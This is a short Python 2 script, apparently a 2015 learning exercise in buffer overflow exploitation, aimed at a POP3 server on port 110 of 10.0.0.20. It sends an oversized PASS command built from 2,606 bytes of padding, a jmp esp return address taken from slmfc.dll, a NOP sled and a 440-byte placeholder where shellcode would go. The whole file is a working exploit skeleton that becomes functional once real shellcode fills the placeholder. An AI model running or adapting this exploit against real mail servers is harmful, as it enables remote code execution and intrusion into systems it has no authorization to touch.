#!/usr/bin/env python
# cccgoe 02.06.2015 - buffer overflow exploitation basics
# sending a unique pattern to determine the exact offset to overwrite stored EIP on the stack

#import socket library
import socket

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# padding to reach EIP offset
padding = 'A' * 2606

# overwrite saved EIP with address to jmp esp instruction in slmfc.dll at 5F4A358F ---little endian---> \x8f\x35\x4a\x5f
EIP = '\x8f\x35\x4a\x5f'

# place NOP's in exploit variable for demonstration purposes
nop = '\x90' * 10 

# placeholder for payload
payload = 'C' * 440

# assembeling the buffer string
buffer = padding + EIP + nop + payload

# exception handler
try:
	print '\nSending buffer...'
	s.connect (('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'


